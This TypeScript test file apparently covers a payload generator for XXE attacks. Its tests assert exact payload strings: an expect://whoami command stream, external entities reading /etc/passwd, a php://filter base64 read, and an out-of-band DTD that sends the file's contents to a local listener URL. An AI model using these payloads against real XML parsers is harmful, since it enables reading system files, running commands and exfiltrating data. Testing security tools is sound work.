/* eslint-disable @typescript-eslint/ban-ts-ignore */

import { expect } from 'chai';
import { PayloadGenerator, Encoding } from '../src/PayloadGenerator';



describe('Payload Generator', () => {

  const readFileEntiity = { name: "file", parameter: false, system: true, value: "/etc/passwd" };

  it('should generate expect stream', () => {
    // @ts-ignore
    const s = PayloadGenerator.expectStream("whoami");
    expect(s).to.eq("expect://whoami");
  });

  it('should generate file stream', () => {
    // @ts-ignore
    const s = PayloadGenerator.fileStream("/etc/passwd");
    expect(s).to.eq("file:///etc/passwd");
  });

  it('should replace xml placeholder', () => {
    // @ts-ignore
    const s = PayloadGenerator.replacePlaceholderWithEntity("<root>{{XXE}}</root>", "test");
    expect(s).to.eq("<root>&test;</root>");
  });

  it('should return string to call entity', () => {
    // @ts-ignore
    const s = PayloadGenerator.callEntity("test");
    expect(s).to.eq("&test;");
  });

  it('should inject doc type', () => {
    // @ts-ignore
    const s = PayloadGenerator.injectDocType("<?xml something><root></root>", "doctype");
    expect(s).to.eq("<?xml something>\ndoctype<root></root>");
  });

  it('should create strings for entities', () => {
    // @ts-ignore
    const s = PayloadGenerator.createEntityString({ name: "file", parameter: true, system: true, value: "/etc/passwd" });
    expect(s).to.eq('<!ENTITY % file SYSTEM "/etc/passwd">\n');

    // @ts-ignore
    const s2 = PayloadGenerator.createEntityString({ name: "file", parameter: false, system: true, value: "/etc/passwd" });
    expect(s2).to.eq('<!ENTITY file SYSTEM "/etc/passwd">\n');

    // @ts-ignore
    const s3 = PayloadGenerator.createEntityString({ name: "file", parameter: true, system: false, value: "/etc/passwd" });
    expect(s3).to.eq('<!ENTITY % file "/etc/passwd">\n');

    // @ts-ignore
    const s4 = PayloadGenerator.createEntityString({ name: "file", parameter: true, system: false, value: "/etc/passwd" }, Encoding.PHP_BASE64, true);
    expect(s4).to.eq('<!ENTITY &#x25; file \'php://filter/read=convert.base64-encode/resource=file:///etc/passwd\'>');
  });

  it('should create doctype', () => {
    // @ts-ignore
    const s = PayloadGenerator.createDocType([
      readFileEntiity,
      "<ENTITY file2 SYSTEM \"/etc/passwd\""
    ]);

    expect(s).to.eq('<!DOCTYPE xxeDT [\n   <!ENTITY file SYSTEM "/etc/passwd">\n   <ENTITY file2 SYSTEM "/etc/passwd"\n]>\n');
  });


  it('should create DTD for data extraction', () => {
    // @ts-ignore
    const s = PayloadGenerator.dataExtractionEvilDTDContent(readFileEntiity, Encoding.NORMAL);
    expect(s).to.eq('<!ENTITY % file SYSTEM "/etc/passwd">\n<!ENTITY % extraction "<!ENTITY &#x25; OOB SYSTEM \'http://127.0.0.1:18363/?p=%file;\'>">\n');
  });




});